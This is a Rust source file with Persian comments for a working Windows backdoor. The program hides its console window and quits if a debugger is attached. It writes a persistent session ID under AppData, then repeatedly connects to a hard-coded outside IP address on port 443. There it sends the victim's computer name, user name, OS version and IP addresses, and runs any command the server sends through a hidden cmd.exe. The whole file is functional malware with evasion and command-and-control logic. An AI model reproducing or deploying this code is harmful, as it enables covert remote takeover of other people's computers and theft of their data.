use std::ptr::{null, null_mut};
use std::ffi::CString;
use std::fs::{self, File};
use std::io::Read;
use std::path::PathBuf;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::winbase::CREATE_NO_WINDOW;
use winapi::um::fileapi::ReadFile;
use winapi::um::winnt::HANDLE;
use std::mem::{size_of, zeroed};
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::Duration;
use rand::Rng;
use std::thread;
use winapi::um::namedpipeapi::CreatePipe;
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::wincon::GetConsoleWindow;
use winapi::um::winuser::ShowWindow;
use winapi::um::winnt::OSVERSIONINFOEXW;
use std::env;

// تابع برای دریافت یا ایجاد شناسه سشن ثابت
fn get_or_create_session_id() -> u32 {
    let session_file_path = get_session_file_path();
    
    // اگر فایل وجود دارد، شناسه را بخوان
    if PathBuf::from(&session_file_path).exists() {
        if let Ok(mut file) = File::open(&session_file_path) {
            let mut contents = String::new();
            if file.read_to_string(&mut contents).is_ok() {
                if let Ok(id) = contents.trim().parse::<u32>() {
                    return id;
                }
            }
        }
    }
    
    // ایجاد شناسه جدید
    let mut rng = rand::thread_rng();
    let new_id: u32 = rng.gen_range(10000..=99999);
    
    // ذخیره شناسه در فایل
    if let Ok(mut file) = File::create(&session_file_path) {
        use std::io::Write;
        let _ = write!(file, "{}", new_id);
    }
    
    new_id
}

// تابع برای دریافت مسیر فایل شناسه سشن
fn get_session_file_path() -> String {
    // استفاده از پوشه AppData برای ذخیره فایل
    let mut path = std::env::var("APPDATA").unwrap_or_else(|_| ".".to_string());
    path.push_str("\\Microsoft\\session_id.txt");
    path
}

// تابع برای اجرای دستورات به صورت مخفی با حفظ دایرکتوری فعلی
fn execute_command_hidden(command: &str, current_dir: &str) -> String {
    unsafe {
        let mut h_stdout_read: HANDLE = null_mut();
        let mut h_stdout_write: HANDLE = null_mut();
        let mut h_stderr_read: HANDLE = null_mut();
        let mut h_stderr_write: HANDLE = null_mut();

        let mut sa_attr: SECURITY_ATTRIBUTES = zeroed();
        sa_attr.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
        sa_attr.bInheritHandle = 1;

        if CreatePipe(&mut h_stdout_read, &mut h_stdout_write, &mut sa_attr, 0) == 0 {
            return "Failed to create stdout pipe".to_string();
        }

        if CreatePipe(&mut h_stderr_read, &mut h_stderr_write, &mut sa_attr, 0) == 0 {
            CloseHandle(h_stdout_read);
            CloseHandle(h_stdout_write);
            return "Failed to create stderr pipe".to_string();
        }

        let mut si: STARTUPINFOA = zeroed();
        si.cb = size_of::<STARTUPINFOA>() as u32;
        si.dwFlags |= winapi::um::winbase::STARTF_USESTDHANDLES;
        si.hStdOutput = h_stdout_write;
        si.hStdError = h_stderr_write;

        let mut pi: PROCESS_INFORMATION = zeroed();

        // تبدیل دایرکتوری فعلی به CString
        let current_dir_cstr = CString::new(current_dir).unwrap();
        
        // ساخت دستور کامل
        let cmd_line = CString::new(format!("cmd.exe /C {}", command)).unwrap();

        let success = CreateProcessA(
            null(),
            cmd_line.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            1,
            CREATE_NO_WINDOW,
            null_mut(),
            current_dir_cstr.as_ptr() as *const i8, // تنظیم دایرکتوری فعلی
            &mut si,
            &mut pi,
        );

        if success == 0 {
            CloseHandle(h_stdout_read);
            CloseHandle(h_stdout_write);
            CloseHandle(h_stderr_read);
            CloseHandle(h_stderr_write);
            return "Failed to create process".to_string();
        }

        CloseHandle(h_stdout_write);
        CloseHandle(h_stderr_write);

        let mut output = String::new();
        let mut buffer = [0u8; 4096];
        let mut bytes_read = 0;
        let mut has_output = false;

        loop {
            if ReadFile(h_stdout_read, buffer.as_mut_ptr() as *mut _, buffer.len() as u32, &mut bytes_read, null_mut()) == 0 {
                break;
            }
            if bytes_read == 0 {
                break;
            }
            has_output = true;
            output.push_str(&String::from_utf8_lossy(&buffer[..bytes_read as usize]));
        }

        loop {
            if ReadFile(h_stderr_read, buffer.as_mut_ptr() as *mut _, buffer.len() as u32, &mut bytes_read, null_mut()) == 0 {
                break;
            }
            if bytes_read == 0 {
                break;
            }
            has_output = true;
            output.push_str(&String::from_utf8_lossy(&buffer[..bytes_read as usize]));
        }

        CloseHandle(h_stdout_read);
        CloseHandle(h_stderr_read);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // اگر خروجی نداشت، یک پیام موفقیت برگردان
        if !has_output {
            "OK".to_string()
        } else {
            output
        }
    }
}

// تابع برای ایجاد تأخیر تصادفی
fn random_delay() {
    let mut rng = rand::thread_rng();
    let delay = rng.gen_range(5000..15000);
    thread::sleep(Duration::from_millis(delay));
}

// تابع برای بررسی محیط دیباگ
fn is_debugger_present() -> bool {
    unsafe {
        winapi::um::debugapi::IsDebuggerPresent() != 0
    }
}

// تابع برای جمع‌آوری اطلاعات سیستم
fn get_system_info() -> String {
    unsafe {
        let mut info = String::new();
        
        // Computer Name
        let mut buffer = [0u16; 256];
        let mut size = 256u32;
        let len = winapi::um::winbase::GetComputerNameW(buffer.as_mut_ptr(), &mut size);
        if len != 0 {
            let name = String::from_utf16_lossy(&buffer[..size as usize]);
            info.push_str(&format!("Computer Name: {}\n", name));
        }
        
        // User Name
        let mut buffer = [0u16; 256];
        let mut size = 256u32;
        let len = winapi::um::winbase::GetUserNameW(buffer.as_mut_ptr(), &mut size);
        if len != 0 {
            let name = String::from_utf16_lossy(&buffer[..size as usize]);
            info.push_str(&format!("User Name: {}\n", name));
        }
        
        // OS Version
        let mut version_info: OSVERSIONINFOEXW = zeroed();
        version_info.dwOSVersionInfoSize = size_of::<OSVERSIONINFOEXW>() as u32;
        if winapi::um::sysinfoapi::GetVersionExW(&mut version_info as *mut _ as *mut _) != 0 {
            info.push_str(&format!("OS Version: {}.{}.{}\n", 
                                   version_info.dwMajorVersion, 
                                   version_info.dwMinorVersion, 
                                   version_info.dwBuildNumber));
        }
        
        // Current Directory
        if let Ok(current_dir) = env::current_dir() {
            info.push_str(&format!("Current Directory: {}\n", current_dir.display()));
        }
        
        // IP Addresses - نسخه ساده بدون استفاده از توابع پیچیده
        info.push_str("IP Addresses: \n");
        
        // استفاده از دستور ipconfig برای دریافت آدرس‌های IP
        let ip_output = execute_command_hidden("ipconfig", &env::current_dir().unwrap_or_default().to_string_lossy().into_owned());
        for line in ip_output.lines() {
            if line.contains("IPv4") || line.contains("IPv6") {
                info.push_str(&format!("  {}\n", line.trim()));
            }
        }
        
        info
    }
}

#[tokio::main]
async fn main() {
    if is_debugger_present() {
        return;
    }

    unsafe {
        ShowWindow(GetConsoleWindow(), 0);
    }
    
    // دریافت یا ایجاد شناسه سشن ثابت
    let session_id = get_or_create_session_id();
    let session_id_str = session_id.to_string();

    // دریافت دایرکتوری فعلی
    let mut current_dir = env::current_dir().unwrap_or_default();
    let mut current_dir_str = current_dir.to_string_lossy().into_owned();

    // تغییر پورت به 443
    let server_addr = "5.144.179.247:443";

    loop {
        random_delay();

        if let Ok(mut stream) = TcpStream::connect(server_addr).await {
            // تنظیمات TCP Keep-Alive برای جلوگیری از قطع شدن اتصال
            if let Err(e) = stream.set_nodelay(true) {
                eprintln!("Failed to set TCP_NODELAY: {}", e);
            }
            
            // ارسال شناسه سشن به سرور
            if let Err(_) = stream.write_all(session_id_str.as_bytes()).await {
                continue;
            }

            // حلقه اصلی برای دریافت دستورات
            loop {
                let mut buffer = vec![0u8; 4096];
                match stream.read(&mut buffer).await {
                    Ok(0) => {
                        // اتصال توسط سرور بسته شد
                        break;
                    }
                    Ok(n) => {
                        let command = String::from_utf8_lossy(&buffer[..n]).trim().to_string();
                        
                        let output = if command == "get_system_info" {
                            get_system_info()
                        } else if command.starts_with("cd ") {
                            // تغییر دایرکتوری
                            let target_dir = &command[3..].trim();
                            match env::set_current_dir(target_dir) {
                                Ok(_) => {
                                    // به‌روزرسانی دایرکتوری فعلی
                                    current_dir = env::current_dir().unwrap_or_default();
                                    current_dir_str = current_dir.to_string_lossy().into_owned();
                                    format!("Changed directory to: {}", current_dir_str)
                                }
                                Err(e) => format!("Error changing directory: {}", e),
                            }
                        } else if command == "cd" {
                            // نمایش دایرکتوری فعلی
                            format!("Current directory: {}", current_dir_str)
                        } else {
                            // اجرای دستور در دایرکتوری فعلی
                            execute_command_hidden(&command, &current_dir_str)
                        };
                        
                        // همیشه یک پاسخ ارسال کن
                        if let Err(_) = stream.write_all(output.as_bytes()).await {
                            break;
                        }
                    }
                    Err(e) => {
                        eprintln!("Read error: {}", e);
                        break;
                    }
                }
            }
        }
    }
}